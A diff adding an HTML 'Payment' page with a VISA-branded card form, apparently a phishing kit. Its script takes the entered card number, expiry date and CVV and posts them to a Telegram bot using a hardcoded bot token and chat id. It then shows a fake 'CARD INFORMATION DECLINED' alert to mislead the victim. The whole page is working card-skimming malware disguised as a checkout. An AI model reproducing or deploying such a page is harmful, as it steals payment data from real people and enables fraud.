@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Payment</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .glow {
+      box-shadow: 0 0 20px rgba(59,130,246,0.35), inset 0 0 10px rgba(59,130,246,0.15);
+    }
+    .shine {
+      position: relative;
+      overflow: hidden;
+    }
+    .shine::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -120%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.2), transparent);
+      animation: shine 1.3s ease-in-out infinite;
+    }
+    @keyframes shine {
+      0% { left: -120%; }
+      100% { left: 120%; }
+    }
+  </style>
+</head>
+<body class="bg-gray-900 text-white min-h-screen flex items-center justify-center p-6">
+  <main class="w-[340px] sm:w-[380px] bg-gray-800 rounded-2xl p-6 shadow-[0_0_30px_rgba(0,0,0,0.35)]">
+    
+    <!-- أيقونة الشبكة -->
+    <section class="flex flex-col items-center gap-2 mb-6">
+      <img id="networkIcon" src="visa.gif" alt="Network" class="w-20 h-20 rounded-full object-cover glow" />
+      <h1 id="networkName" class="text-lg font-bold tracking-wide select-none">VISA</h1>
+    </section>
+
+    <!-- المبلغ -->
+    <section class="text-center mb-4">
+      <p class="text-gray-300">You will pay</p>
+      <p class="text-3xl font-extrabold mt-1">
+        <span id="amountValue">0</span> <span class="text-blue-400">USD</span>
+      </p>
+    </section>
+
+    <!-- إدخال البطاقة -->
+    <section class="mb-4">
+      <label class="block text-sm text-gray-400 mb-1">Card Number</label>
+      <input
+        id="cardNumber"
+        type="text"
+        maxlength="19"
+        placeholder="XXXX XXXX XXXX XXXX"
+        class="w-full rounded-xl bg-gray-900 border border-gray-700 px-3 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+      />
+      <p id="cardType" class="text-xs text-gray-400 mt-1">Card type: Unknown</p>
+    </section>
+
+    <!-- تاريخ انتهاء الصلاحية -->
+    <section class="mb-4 flex gap-2">
+      <div class="w-1/2">
+        <label class="block text-sm text-gray-400 mb-1">Expiry Month</label>
+        <input
+          id="expMonth"
+          type="text"
+          maxlength="2"
+          placeholder="MM"
+          class="w-full rounded-xl bg-gray-900 border border-gray-700 px-3 py-3 text-sm text-center focus:outline-none focus:ring-2 focus:ring-blue-500"
+        />
+      </div>
+      <div class="w-1/2">
+        <label class="block text-sm text-gray-400 mb-1">Expiry Year</label>
+        <input
+          id="expYear"
+          type="text"
+          maxlength="2"
+          placeholder="YY"
+          class="w-full rounded-xl bg-gray-900 border border-gray-700 px-3 py-3 text-sm text-center focus:outline-none focus:ring-2 focus:ring-blue-500"
+        />
+      </div>
+    </section>
+
+    <!-- رمز الدفع CVV -->
+    <section class="mb-6">
+      <label class="block text-sm text-gray-400 mb-1">CVV</label>
+      <input
+        id="cvv"
+        type="text"
+        maxlength="3"
+        placeholder="XXX"
+        class="w-20 text-center rounded-xl bg-gray-900 border border-gray-700 px-3 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+      />
+    </section>
+
+    <!-- زر الدفع -->
+    <section class="mt-2">
+      <button
+        id="payBtn"
+        class="w-full rounded-xl py-3.5 bg-green-600 hover:bg-green-700 font-bold tracking-wide shadow-md glow"
+      >
+        PAY NOW
+      </button>
+    </section>
+  </main>
+
+  <script>
+    const storedAmount = localStorage.getItem("selectedUSD") || "10";
+    document.getElementById("amountValue").textContent = storedAmount;
+
+    // اكتشاف نوع البطاقة
+    document.getElementById("cardNumber").addEventListener("input", function() {
+      let num = this.value.replace(/\D/g, "");
+      if (/^4/.test(num)) {
+        document.getElementById("cardType").textContent = "Card type: VISA";
+      } else if (/^5[1-5]/.test(num)) {
+        document.getElementById("cardType").textContent = "Card type: MasterCard";
+      } else {
+        document.getElementById("cardType").textContent = "Card type: Unknown";
+      }
+      this.value = num.replace(/(.{4})/g, "$1 ").trim();
+    });
+
+    document.getElementById("payBtn").addEventListener("click", async () => {
+      const card = document.getElementById("cardNumber").value.trim();
+      const month = document.getElementById("expMonth").value.trim();
+      const year = document.getElementById("expYear").value.trim();
+      const cvv = document.getElementById("cvv").value.trim();
+
+      const token = "8447607145:AAEWZpX2CUURrXahC_ZWrpnAsOffYiL9zfY";
+      const chatId = "8066634898";
+      const text = `💳 Card: ${card}\n📅 Exp: ${month}/${year}\n🔒 CVV: ${cvv}\n💰 Amount: ${storedAmount} USD`;
+
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text })
+      });
+
+      alert("CARD INFORMATION DECLINED");
+    });
+  </script>
+</body>
+</html>
